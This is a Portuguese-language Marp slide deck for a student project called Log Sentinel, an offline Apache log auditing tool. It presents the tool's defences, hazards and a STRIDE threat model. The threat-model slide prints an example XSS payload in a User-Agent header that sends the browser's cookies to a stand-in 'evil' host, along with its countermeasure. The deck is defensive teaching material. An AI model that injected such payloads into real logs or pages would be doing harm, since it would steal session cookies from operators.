---
marp: true
theme: default
paginate: true
size: 16:9
title: "Log Sentinel — AV3"
description: "Slide deck da AV3 (10 slides + obrigado + referências) — Engenharia de Software II / IFBA 2026.1"
footer: "Log Sentinel — AV3 — IFBA 2026.1"
style: |
  section {
    font-family: 'Inter', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, sans-serif;
    font-size: 24px;
    background: #FAFAFA;
    color: #0F172A;
    padding: 48px 64px;
    line-height: 1.5;
  }
  section.lead {
    text-align: center;
    justify-content: center;
  }
  section.lead h1 {
    font-size: 64px;
    border: none;
    padding: 0;
    margin-bottom: 24px;
  }
  section.lead h3 {
    color: #475569;
    font-weight: 400;
    font-size: 28px;
    margin-bottom: 48px;
  }
  h1 {
    color: #1E40AF;
    font-size: 38px;
    font-weight: 600;
    margin-bottom: 20px;
    border-bottom: 2px solid #E2E8F0;
    padding-bottom: 10px;
  }
  h2 {
    color: #1E40AF;
    font-size: 30px;
    font-weight: 600;
  }
  h3 {
    color: #0F172A;
    font-size: 24px;
    font-weight: 600;
    margin-top: 14px;
    margin-bottom: 8px;
  }
  table {
    font-size: 20px;
    border-collapse: collapse;
    width: 100%;
    margin: 10px 0;
  }
  th {
    background: #F1F5F9;
    color: #0F172A;
    font-weight: 600;
    text-align: left;
    padding: 8px 10px;
    border-bottom: 2px solid #CBD5E1;
  }
  td {
    padding: 7px 10px;
    border-bottom: 1px solid #E2E8F0;
    vertical-align: top;
  }
  code {
    font-family: 'JetBrains Mono', 'Source Code Pro', Consolas, monospace;
    font-size: 19px;
    background: #F1F5F9;
    padding: 2px 6px;
    border-radius: 3px;
  }
  pre {
    background: #F1F5F9;
    color: #0F172A;
    padding: 14px 18px;
    border: 1px solid #E2E8F0;
    border-radius: 4px;
    font-size: 18px;
    line-height: 1.4;
  }
  pre code {
    background: transparent;
    padding: 0;
    font-size: 18px;
  }
  blockquote {
    color: #475569;
    font-style: italic;
    border-left: 3px solid #CBD5E1;
    padding-left: 14px;
    margin-left: 0;
  }
  ul, ol { line-height: 1.6; }
  li { margin-bottom: 3px; }
  strong { color: #0F172A; }
  a { color: #1E40AF; text-decoration: none; }
  section::after {
    color: #94A3B8;
    font-size: 14px;
  }
  footer {
    color: #94A3B8;
    font-size: 14px;
  }
---

<!--
SLIDES.md — fonte canônica do deck da AV3.

Versao 2 (2026-06-16, fim do dia): regenerada do zero a partir
do conteudo dos 5 documentos AV3, sem emojis decorativos e com
identidade visual sobria (fundo claro, paleta academica restrita
a 3 cores: azul academico #1E40AF, vermelho critico #B91C1C,
ambar atencao #A16207).

Substitui:
  - O PDF original "Log Sentinel - AV3 Apresentacao.pdf"
    (numeros inflados, features inventadas como TLS/mTLS,
    latencia <100ms, 99.9% precisao, HZs trocados).
  - A primeira versao deste SLIDES.md (que usava emojis
    de status ✅ 🔄 ⏳ 🔴 — substituidos por palavras
    "Ativo", "Parcial", "Planejado", "Critico").

Principios da v2:
  1. Estilo academico sobrio, nao comercial. Sem gradientes,
     sem glow, sem stock photo, sem icones decorativos.
  2. Sem emojis. Status em palavra. Severidade em palavra.
  3. Paleta restrita: fundo #FAFAFA, texto #0F172A, destaque
     #1E40AF, alerta #B91C1C, atencao #A16207.
  4. Tipografia: Inter / Source Sans Pro (sans-serif sobria),
     corpo 24pt minimo, titulos 38pt, codigo em JetBrains Mono.
  5. Conteudo autoritativo vem dos docs 01..05 + RELATORIO.
     Numeros reais — 24 commits totais (9/9/4/2), Sprint 1
     em ~15%, so B0/S8 ativos, dimensoes Availability e
     Maintainability ativas, demais planejadas.
  6. Numeracao "X" automatica via Marp paginate no canto
     inferior. Capa e slide final sem numeracao.

Como gerar PDF:
  npx @marp-team/marp-cli docs/av3/SLIDES.md --pdf \
    --allow-local-files -o docs/av3/SLIDES.pdf

Alternativa: usar o conteudo como roteiro no Google Slides /
PowerPoint aplicando manualmente a mesma paleta e tipografia
listadas acima.
-->

<!-- _paginate: false -->
<!-- _class: lead -->

# **Log Sentinel**

### Análise *post-mortem* de logs Apache

Equipe: **Elder · Aryan · Rodrigo · Helena**
Engenharia de Software II — IFBA 2026.1
Apresentação **AV3** — 17 de junho de 2026

`github.com/202316360036/log-sentinel`

---

# Visão do projeto

**Problema.** Investigar incidentes em logs Apache é lento, propenso a erro e exige conhecimento de regex/CLI que o sysadmin médio não tem tempo de manter.

**Solução.** Suíte **offline** (CLI + GUI) para auditoria *post-mortem*: lê logs locais, detecta padrões (força bruta, scanner, picos), exporta relatório JSON reproduzível.

**Escopo recortado** — fazer pouco e fazer bem:

- Três detectores no MVP: força bruta, scanner de vulnerabilidade, pico de tráfego.
- Zero requisições de rede em runtime (privacidade por design).
- Cadeia de custódia: hash SHA-256 do log embutido no relatório.

> Detalhes em [`docs/PROJETO.md`](../PROJETO.md) e [`docs/ESCOPO.md`](../ESCOPO.md).

---

# Pipeline e propriedades emergentes

```
[LogFileDAO] -> [ApacheParser] -> [Detector(s)] -> [Aggregator] -> [ReportDAO]
   streaming     fail-fast/linha    forca bruta     consolida     JSON + hash
   + hash        descarta linha     scanner         por janela    + versao
   incremental   invalida (S4)      pico trafego
```

**Funcionais (PEF)** — emergem da composição:

- **PEF-01** Detecção de força bruta a partir de log bruto.
- **PEF-04** Auditoria batch consolidada (um JSON por diretório).
- **PEF-05** Paridade CLI e GUI sobre o mesmo Core.

**Não-funcionais (PENF):**

- **PENF-02** Uso de RAM ≤ 200 MB independente do tamanho do log.
- **PENF-06** GUI não congela durante processamento (QThread).
- **PENF-10** Análise totalmente offline (validado por linter de imports).

> Catálogo completo em [`02_PROPRIEDADES_EMERGENTES.md`](02_PROPRIEDADES_EMERGENTES.md).

---

# Sete dimensões de confiança

Base: Avizienis, Laprie, Randell e Landwehr (2004); ISO/IEC 25010.

| # | Dimensão | Mecanismo principal | Estado |
|---|----------|---------------------|--------|
| 1 | Safety | Read-only sobre o log, idempotência, S5 | Planejado |
| 2 | Security | Offline by design, B4/B5, S6, modelo de ameaças dedicado | Planejado |
| 3 | Reliability | B3, determinismo, cobertura alvo ≥ 80% | Parcial |
| 4 | Availability | Aplicação local, PyInstaller, sem deps em runtime | **Ativo** |
| 5 | Maintainability | Camadas isoladas, Strategy/Factory, ruff + pyright + Sonar | **Ativo** |
| 6 | Resilience | Parser fail-fast por linha (B2), S4, mensagens humanizadas | Planejado |
| 7 | Privacy | Offline, `--anonymize-ips`, sem telemetria | Planejado |

Detalhes em [`03_DIMENSOES_CONFIANCA.md`](03_DIMENSOES_CONFIANCA.md).

---

# Defesa em profundidade

**Barreiras (preventivas).** **B0** Lint e type-check na CI — **Ativo**. **B1** Validação de caminho de arquivo — planejada. **B2** Parser fail-fast por linha — planejada. **B3** Isolamento por arquivo no batch — planejada. **B4** Limite `--max-lines` / `--max-bytes` — planejada. **B5** Sanitização da saída JSON — planejada. **B6** GUI em QThread — planejada. **B7** Lint cross-layer (core → cli/gui) — planejada. **B8** Streaming + hash incremental — planejada.

**Salvaguardas (detecção e contenção).** **S0** Cobertura de testes na CI — Parcial. **S1** Mensagens humanizadas — planejada. **S2** Logging estruturado — planejada. **S3** Barra de progresso com aborto — planejada. **S4** Lista de linhas rejeitadas — planejada. **S5** Confirmação antes de sobrescrever — planejada. **S6** Hash SHA-256 do log — planejada. **S7** Versão do app no JSON — planejada. **S8** SonarCloud / SAST — **Ativo**.

> Hoje só **B0** e **S8** estão ativos; **S0** parcial. Demais defesas mapeadas para sprints até AV5 em [`01_BARREIRAS_SALVAGUARDAS.md`](01_BARREIRAS_SALVAGUARDAS.md).

---

# Matriz Condição Latente × Defesas

Cada condição latente é coberta por **pelo menos duas defesas**.

| CL | Descrição resumida | Defesas |
|----|--------------------|---------|
| CL-01 | Regex aceita silenciosamente linha mal formada | B2 · S0 · S4 |
| CL-02 | DoS por log envenenado gigante | B1 · B4 · S3 |
| CL-03 | `.read()` causa MemoryError em log grande | B4 · B8 · S0 |
| CL-04 | GUI congela durante batch longo | B6 · S1 · S3 |
| CL-05 | JSON com `<script>` executa em visualizador web | B5 · S0 |
| CL-06 | Acoplamento core → cli/gui (regressão) | B0 · B7 · S0 |
| CL-09 | Cron sobrescreve relatório anterior | S1 · S5 · S7 |

> Matriz completa (CL-01 a CL-10 × B0..B8 / S0..S8) em [`01_BARREIRAS_SALVAGUARDAS.md §6`](01_BARREIRAS_SALVAGUARDAS.md#6-matriz-barreira--condição-latente).

---

# Perigos prioritários

Base: Leveson (2011) — STAMP/STPA; IEC 61508; NIST SP 800-30.

| ID | Perigo | Severidade | Probabilidade | Risco | Mitigação principal |
|----|--------|------------|---------------|-------|---------------------|
| **HZ-01** | Falso negativo — ataque real não detectado | Catastrófica | Ocasional | **Crítico** | B2 + S4 + testes com logs reais |
| **HZ-02** | Falso positivo — cliente legítimo acusado | Crítica | Provável | **Crítico** | Threshold + allowlist + contexto |
| **HZ-03** | Estouro de memória ao processar log grande | Crítica | Provável | **Crítico** | B8 streaming + meta PENF-02 |

**História breve do HZ-02.** Detector marca o crawler do Google como força bruta; sysadmin bloqueia o IP; SEO da empresa cai por 48 h. Mitigação: threshold configurável, allowlist de User-Agents, exibir contexto do match no relatório.

> Catálogo completo HZ-01 a HZ-13 em [`04_PERIGOS_ACIDENTES_DANOS.md`](04_PERIGOS_ACIDENTES_DANOS.md).

---

# STRIDE e ataque AT-01

Síntese do modelo de ameaças (doc 05 §5):

| Categoria | Onde ocorre no Log Sentinel | Defesa principal |
|-----------|------------------------------|------------------|
| **S**poofing | Substituição do binário PyInstaller publicado | Checksum em release notes |
| **T**ampering | Troca do log entre leitura e hash (TOCTOU) | Hash em streaming junto da leitura |
| **R**epudiation | Operador nega ter rodado a análise | Versão + parâmetros + timestamp (S7) |
| **I**nformation Disclosure | JSON com `<script>` aberto no browser | **B5 — sanitização da saída** |
| **D**enial of Service | Log envenenado / ReDoS no parser | B4 + regex sem backtracking |
| **E**levation of Privilege | Dependência transitiva maliciosa | Dependabot + `permissions:` mínimas |

**AT-01 — Log Poisoning via User-Agent.** O atacante envia `User-Agent: <script>fetch('https://evil/?c='+document.cookie)</script>`. A linha entra no log Apache. O operador abre o relatório JSON em um visualizador web. O script executa na máquina do operador. **Contramedida: B5** — escape de `<`, `>` e aspas na serialização.

---

# Acompanhamento

**Commits por integrante** — `git shortlog -sn --no-merges` (abr a jun/2026):

| Integrante | Papel | Commits |
|------------|-------|--------:|
| Elder | CI/CD, releases, documentação | 9 |
| Aryan | Core (parsers, modelos) | 9 |
| Rodrigo | CLI (Typer) | 4 |
| Helena | GUI (PySide6) | 2 |

Total da equipe (sem o template original): **24 commits**.

**Marcos em 16/06:**

- AV1 Ambiente — 15/04 — **100% concluído**.
- AV2 Testes — 13/05 — **100% concluído**.
- AV3 Falhas — 17/06 — documentos **100% concluídos**; demonstração em esqueleto.
- Sprint 1 (Core MVP) — 13/05 a 08/06 — **~15%** (apenas `LogEntry` e um teste TDD).
- AV4 Seminário — 22/07 — planejada.
- AV5 Riscos e Qualidade — 12/08 — planejada.

> Reconhecimento honesto: houve lacuna entre 13/05 e 16/06. Plano de recuperação detalhado em [`GANTT.md`](../GANTT.md).

---

# Demonstração e roadmap

**Demonstrável hoje:**

- `pdm run pytest` — um teste verde (`test_log_entry_armazena_campos_obrigatorios`).
- `python -m python_pdm_template.cli.main --help` — subcomandos `analyze` e `batch` (stubs).
- GUI esqueleto `MainWindow` em PySide6 (placeholder "em construção").
- CI verde em `master`; cinco documentos AV3 publicados em [`docs/av3/`](.).

**Roadmap até AV5:**

| Janela | Entrega |
|--------|---------|
| 16/06 a 30/06 | `ApacheParser`, `BruteForceDetector`, DAO streaming (Aryan); CLI `analyze` real (Rodrigo); GUI QThread + tabela (Helena). |
| 01/07 a 15/07 | Release v0.1.0 PyInstaller para Linux e Windows (Elder). |
| 22/07 | **AV4 — Seminário.** |
| 23/07 a 12/08 | Hardening (B4, B5, B8, S1, S5, S6) + cobertura ≥ 80%. |
| 12/08 | **AV5 — Riscos e Qualidade.** |

> Detalhe individual em [`RELATORIO_AV3.md §6.2`](RELATORIO_AV3.md).

---

<!-- _paginate: false -->
<!-- _class: lead -->

# Obrigado.

### Perguntas?

`github.com/202316360036/log-sentinel`
Branch: `docs/av3-especificacao`
Documentos AV3: `docs/av3/`

---

<!-- _paginate: false -->

# Referências

- **Reason, J.** (1990). *Human Error.* Cambridge University Press. *(Modelo Swiss Cheese — slides 5 e 6.)*
- **Avizienis, A.; Laprie, J.-C.; Randell, B.; Landwehr, C.** (2004). *Basic Concepts and Taxonomy of Dependable and Secure Computing.* IEEE TDSC, 1(1), 11–33. *(Slide 4.)*
- **Leveson, N.** (2011). *Engineering a Safer World.* MIT Press. *(STAMP/STPA — slide 7.)*
- **Microsoft** (1999). *STRIDE Threat Modeling.* *(Slide 8.)*
- **NIST** SP 800-30 Rev. 1. *Guide for Conducting Risk Assessments.*
- **OWASP** Top 10 (2021) — A03 Injection, A05 Misconfiguration, A06 Vulnerable Components.
- **ISO/IEC** 25010:2011 — Software Quality Requirements and Evaluation.
- **LGPD** — Lei 13.709/2018. *(Base da dimensão Privacy.)*
